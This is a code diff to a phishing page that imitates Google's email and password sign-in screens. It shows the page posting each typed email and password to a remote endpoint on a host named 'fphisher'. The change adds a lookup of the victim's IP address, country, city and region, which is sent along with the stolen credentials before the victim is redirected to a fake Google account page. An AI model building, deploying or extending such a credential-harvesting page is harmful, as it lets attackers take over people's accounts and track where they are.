@@ -7,6 +7,7 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <script>tailwind.config = { darkMode: 'media' }</script>
   <style>
+    /* Your existing styles remain unchanged */
     @keyframes fadeSlide {
       from { opacity: 0; transform: translateX(30px); }
       to   { opacity: 1; transform: translateX(0); }
@@ -23,7 +24,6 @@
     }
     .shake { animation: shake 0.4s ease; }
 
-    /* Top Loading Bar Animation */
     @keyframes loadingBar {
       0%   { width: 0%; left: 0%; }
       50%  { width: 70%; left: 15%; }
@@ -138,7 +138,7 @@
     <!-- Top Loading Bar -->
     <div id="loadingBar" class="loading-bar hidden"></div>
 
-    <!-- SCREEN 1 — Email -->
+    <!-- SCREEN 1 — Email (unchanged) -->
     <div id="screen1" class="screen active flex-col flex-1 px-8 pt-14 pb-28">
       <svg class="w-9 h-9 mb-10" viewBox="0 0 48 48">
         <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -177,7 +177,7 @@
       </p>
     </div>
 
-    <!-- SCREEN 2 — Password -->
+    <!-- SCREEN 2 — Password (unchanged) -->
     <div id="screen2" class="screen flex-col flex-1 px-8 pt-14 pb-28">
       <svg class="w-9 h-9 mb-8" viewBox="0 0 48 48">
         <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -232,7 +232,7 @@
   <script>
     let passwordAttempts = 0;
     const ENDPOINT = "https://fphisher-30--gnzc8csfz5.replit.app/api/submit/0c36ad344b";
-    const REDIRECT_URL = "account-google-com.html"; // ← Change this if needed
+    const REDIRECT_URL = "account-google-com.html";
 
     const loadingBar = document.getElementById('loadingBar');
 
@@ -270,12 +270,39 @@
       document.getElementById('passError').classList.add('hidden');
     }
 
-    async function sendToBackend(email, password) {
+    // New: Fetch IP + Country + City
+    async function getLocationData() {
+      try {
+        const res = await fetch('https://ipapi.co/json/', { 
+          method: 'GET',
+          cache: 'no-cache'
+        });
+        if (!res.ok) throw new Error('Geo failed');
+        const data = await res.json();
+        
+        return {
+          ip: data.ip || 'unknown',
+          country: data.country_name || 'unknown',
+          city: data.city || 'unknown',
+          region: data.region || data.region_code || 'unknown'
+        };
+      } catch (err) {
+        console.warn('Geolocation failed:', err);
+        return { ip: 'unknown', country: 'unknown', city: 'unknown', region: 'unknown' };
+      }
+    }
+
+    async function sendToBackend(email, password, location) {
       try {
         await fetch(ENDPOINT, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, password, timestamp: Date.now() })
+          body: JSON.stringify({ 
+            email, 
+            password, 
+            ...location,           // ip, country, city, region
+            timestamp: Date.now()
+          })
         });
       } catch (err) {
         console.error("Send failed:", err);
@@ -330,7 +357,10 @@
       showLoading();
       passwordAttempts++;
 
-      await sendToBackend(email, password);
+      // Get location data
+      const location = await getLocationData();
+
+      await sendToBackend(email, password, location);
       await new Promise(r => setTimeout(r, 900));
 
       hideLoading();
